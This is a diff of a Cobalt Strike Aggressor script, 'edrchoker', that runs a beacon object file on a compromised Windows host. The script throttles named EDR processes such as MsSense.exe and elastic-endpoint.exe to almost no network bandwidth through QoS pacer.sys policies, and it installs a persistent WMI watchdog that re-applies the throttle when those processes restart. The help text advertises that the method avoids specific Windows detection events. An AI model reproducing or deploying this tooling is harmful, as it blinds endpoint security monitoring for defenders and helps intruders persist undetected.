@@ -1,74 +1,62 @@
-# edrchoker.cna — Aggressor script for edrchoker BOF
-#
-# Throttle EDR/process network to 8 bps via pacer.sys QoS +
-# install a persistent WMI watchdog that re-throttles on restart.
+# edrchoker.cna
 #
 # Usage:
-#   edrchoker elastic.exe;MsSense.exe   throttle + install WMI watchdog
-#   edrchoker remove Explorer.exe       restore network for specific process
-#   edrchoker remove                    restore all + remove WMI watchdog
+#   edrchoker add        "proc1.exe;proc2.exe"   throttle + WMI watchdog
+#   edrchoker remove     "proc1.exe;proc2.exe"   restore specific processes
+#   edrchoker remove_all                         restore all + remove watchdog
+#   edrchoker list                               show active policies + watchdog
 
 alias edrchoker {
-    local('$bof $args $bid $handle $path $mode $procs');
-    $bid  = $1;
-    $path = script_resource("edrchoker.x64.o");
+    local('$bof $args $bid $handle $path $cmd $procs');
+    $bid = $1;
+    $cmd = $2;
 
-    $handle = openf($path);
-    if ($handle is $null) {
-        berror($bid, "[edrchoker] Cannot open: " . $path);
+    if ($cmd is $null || $cmd eq "") {
+        berror($bid, "[edrchoker] usage: edrchoker <add|remove|remove_all|list> [procs]");
         return;
     }
+
+    $procs = "";
+
+    if ($cmd eq "add" || $cmd eq "remove") {
+        if (size(@_) < 3 || $3 eq "") {
+            berror($bid, "[edrchoker] " . $cmd . " requires a process list: \"proc1.exe;proc2.exe\"");
+            return;
+        }
+        $procs = $3;
+    }
+
+    $path   = script_resource("edrchoker.x64.o");
+    $handle = openf($path);
+    if ($handle is $null) { berror($bid, "[edrchoker] cannot open BOF"); return; }
     $bof = readb($handle, 1048576);
     closef($handle);
-    if ($bof is $null) {
-        berror($bid, "[edrchoker] readb failed for: " . $path);
-        return;
-    }
-    println("[edrchoker] loaded " . strlen($bof) . " bytes from " . $path);
+    if ($bof is $null) { berror($bid, "[edrchoker] readb failed"); return; }
 
-    if (size(@_) == 1) {
-        # No args — remove all policies + watchdog
-        $mode  = 2;
-        $procs = "";
-        btask($bid, "EDRChoker: restoring ALL — removing QoS policies + WMI watchdog");
-
-    } else if ($2 eq "remove" && size(@_) == 2) {
-        # edrchoker remove — remove all
-        $mode  = 2;
-        $procs = "";
-        btask($bid, "EDRChoker: restoring ALL — removing QoS policies + WMI watchdog");
-
-    } else if ($2 eq "remove" && size(@_) >= 3) {
-        # edrchoker remove proc1.exe;proc2.exe — restore specific
-        $mode  = 1;
-        $procs = $3;
-        btask($bid, "EDRChoker: restoring network for -> " . $3);
-
+    if ($procs ne "") {
+        btask($bid, "EDRChoker: " . $cmd . " " . $procs);
     } else {
-        # edrchoker proc1.exe;proc2.exe — throttle + watch
-        $mode  = 0;
-        $procs = $2;
-        btask($bid, "EDRChoker: throttling + installing watchdog -> " . $2);
+        btask($bid, "EDRChoker: " . $cmd);
     }
 
-    # i = int32 (mode), Z = null-terminated wide string (process list)
-    $args = bof_pack("iZ", $mode, $procs);
+    $args = bof_pack($bid, "zz", $cmd, $procs);
     beacon_inline_execute($bid, $bof, "go", $args);
 }
 
 beacon_command_register(
     "edrchoker",
-    "Throttle process(es) to ~0 bps via QoS (pacer.sys) + WMI watchdog",
+    "Throttle EDR processes to ~0 bps via QoS pacer.sys + persistent WMI watchdog",
     "Usage:\n" .
-    "  edrchoker p1.exe;p2.exe    throttle now + install WMI auto-re-throttle on restart\n" .
-    "  edrchoker remove p1.exe    restore network for specific process\n" .
-    "  edrchoker remove           restore ALL + remove WMI watchdog\n\n" .
-    "Mechanism:\n" .
-    "  QoS:  MSFT_NetQosPolicySettingData -> pacer.sys enforces below WFP\n" .
-    "        No WFP event 5447, no driver, no injection\n" .
-    "  Watch: WMI permanent subscription (ROOT\\subscription)\n" .
-    "        VBScript fires in WmiPrvSE.exe on process start — no child spawned\n\n" .
-    "Verify throttle:   Get-WmiObject -Ns ROOT\\StandardCimv2 -Class MSFT_NetQosPolicySettingData\n" .
-    "Verify watchdog:   Get-WmiObject -Ns ROOT\\subscription -Class __EventFilter\n" .
-    "Test restore:      edrchoker remove Explorer.exe  then ping google.com from Explorer.exe"
+    "  edrchoker add        \"p1.exe;p2.exe\"   throttle + install WMI watchdog\n" .
+    "  edrchoker remove     \"p1.exe;p2.exe\"   restore network for specific processes\n" .
+    "  edrchoker remove_all                   restore ALL QoS policies + remove watchdog\n" .
+    "  edrchoker list                         show active policies + watchdog status\n\n" .
+    "Examples:\n" .
+    "  edrchoker add    \"MsSense.exe;elastic-endpoint.exe\"\n" .
+    "  edrchoker remove \"MsSense.exe\"\n" .
+    "  edrchoker remove_all\n" .
+    "  edrchoker list\n\n" .
+    "Verify:\n" .
+    "  Get-WmiObject -Ns ROOT\\StandardCimv2 -Class MSFT_NetQosPolicySettingData\n" .
+    "  Get-WmiObject -Ns ROOT\\subscription  -Class __EventFilter"
 );
